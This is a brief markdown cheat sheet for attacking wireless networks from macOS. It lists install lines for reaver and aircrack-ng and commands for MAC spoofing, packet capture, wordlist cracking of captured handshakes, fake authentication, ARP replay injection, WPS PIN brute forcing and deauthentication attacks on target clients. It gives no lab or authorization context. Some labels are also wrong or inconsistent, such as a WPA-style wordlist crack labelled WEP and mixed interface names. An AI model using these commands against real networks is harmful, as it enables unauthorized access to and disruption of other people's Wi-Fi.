## Tool to install on MACOS

brew install reaver
brew install aircrack-ng

## COMMANDS

**Network interface commands**

    ifconfig                       (List network interface)

    ifconfig "network" down        (Disable network interface)

    ifconfig "network" up          (Enable network interface)

    ifconfig en0 xx:xx:xx:xx:xx:xx (Change mac address)

**Airsuite commands** 

Wireless adapter must allow monitor mode and packet injection here we call it "mo0", to get 
for Mac of your wireless adapter:
run "ifconfig"
MAC-WIRELESS-MONITOR = First twelve digit of the unspec field and replace "-"" by ":""

    airodump-ng mo0                               (Enable sniffer mode)

    airodump-ng --bssid "BSSID" --channel ""      (Capture packets)
    --write "file_name" mo0

    aircrack-ng "file.cap"                        (Crack WEP based wifi)

    aircrack-ng "file.cap" -w "wordlist.txt       (Crack WEP based wifi)

    aireplay-ng --fakeauth 0 -a "MAC-Target"      (Fake auth attack)
    -h "MAC-wireless-monitor" mo0

    aireplay-ng --arpreplay -b "MAC-Target" -h    (Arp packet injection)
    "MAC-wireless-monitor" mo0

    wash -i mon0                                  (Detext WPS networks)


    reaver --bssid "mac-target" --channel "nb"    (Bruteforce PIN WPS)
    --interface mo0 -vvv --no-associate

    aireplay-ng --deauth 4 -a "mac-target-network" (Deauth Attack)
    -c "mac-target-client-to-deauth" mon0


